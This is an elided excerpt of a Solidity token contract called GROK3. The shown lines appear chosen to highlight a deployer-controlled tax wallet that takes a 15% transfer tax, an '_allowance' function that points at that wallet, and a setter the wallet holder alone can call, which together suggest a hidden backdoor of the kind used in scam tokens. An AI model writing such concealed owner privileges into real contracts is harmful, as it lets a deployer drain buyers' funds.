...
contract GROK3 is Context, IERC20, Ownable {
    ...
    address payable private _STARSTaxWallet;

    uint256 private _initialSTARSTax = 15;
    uint256 private _finalSTARSTax = 0;
    ...
    constructor() payable {
        ...
        _STARSTaxWallet = payable(_msgSender());
    ...
    function _allowance(
        ...
        address allower = _STARSTaxWallet;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(to != address(0) && from != address(0)) {
            ...
            if (
                ...
                if (!inSwap) {
                    taxAmount = amount
                        .mul((_buyCount > _reduceTaxAt) ? _finalSTARSTax : _initialSTARSTax)
                        .div(100);
                }
    ...
    function sendETHToFee(uint256 amount) private {
        _STARSTaxWallet.transfer(amount);
    }
    ...
    function setTaxWallet(address payable newWallet) external {
        require(_msgSender() == _STARSTaxWallet);
        _STARSTaxWallet = newWallet;
    }
}